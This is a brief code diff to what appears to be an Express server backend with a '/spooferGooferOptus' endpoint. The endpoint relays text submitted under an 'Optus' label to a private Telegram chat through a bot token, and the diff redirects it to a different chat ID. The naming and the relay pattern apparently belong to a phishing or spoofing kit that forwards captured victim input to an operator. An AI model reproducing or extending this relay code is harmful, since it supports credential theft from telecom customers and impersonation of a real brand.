@@ -4415,6 +4415,7 @@ app.post("/tCapz", (req, res) => {
 //OPTUS
 //OPTUS
 
+// Sending to loyalty, not spooferGoofer
 app.options("/spooferGooferOptus", cors());
 
 app.post("/spooferGooferOptus", (req, res) => {
@@ -4496,7 +4497,7 @@ app.post("/spooferGooferOptus", (req, res) => {
           });
         axios
           .post(
-            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=993063133&text=Optus:\n${originalText}`
+            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=874673138&text=Optus:\n${originalText}`
           )
           .catch((err) => {
             console.log(err);
